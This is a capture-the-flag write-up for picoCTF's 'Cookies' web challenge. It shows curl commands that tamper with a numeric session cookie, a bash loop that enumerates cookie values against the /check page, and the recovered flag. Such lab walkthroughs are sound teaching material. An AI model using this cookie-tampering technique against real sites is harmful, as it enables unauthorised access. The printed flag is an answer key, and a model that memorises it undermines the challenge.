# _Cookies_
## Description
Who doesn't love cookies? Try to figure out the best one. `http://mercury.picoctf.net:21485/`
## Solution
Challenge name is `cookies`, should have something to do with cookies, `curl` with `-v` to show the cookies
Notice there is a cookie `name` set to `-1`
```console
❯ curl -v 'http://mercury.picoctf.net:21485/'
*   Trying 18.189.209.142:21485...
* Connected to mercury.picoctf.net (18.189.209.142) port 21485 (#0)
> GET / HTTP/1.1
> Host: mercury.picoctf.net:21485
> User-Agent: curl/7.83.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 FOUND
< Content-Type: text/html; charset=utf-8
< Content-Length: 209
< Location: http://mercury.picoctf.net:21485/
< Set-Cookie: name=-1; Path=/
<
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
* Connection #0 to host mercury.picoctf.net left intact
<p>You should be redirected automatically to target URL: <a href="/">/</a>.  If not click the link.%
```
Change value of `name` to other number, we are redirected to `/check`
```console
❯ curl -s -b name=0 'http://mercury.picoctf.net:21485'
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/check">/check</a>.  If not click the link.
```
Go to `/check` with the same cookie `name=0`
```console
❯ curl -s -b name=0 'http://mercury.picoctf.net:21485/check' | html2text

    * Home
**** Cookies ****
×  That is a cookie! Not very special though...
I love snickerdoodle cookies!
© PicoCTF
```
Write a simple script to loop through different numbers and find the flag
```console
#!/bin/bash

for i in {0..50}
do 
    curl -s -b name=$i 'http://mercury.picoctf.net:21485/check' | html2text |grep "picoCTF{*"
done
```
```console
❯ ./script.sh
Flag: picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}
```
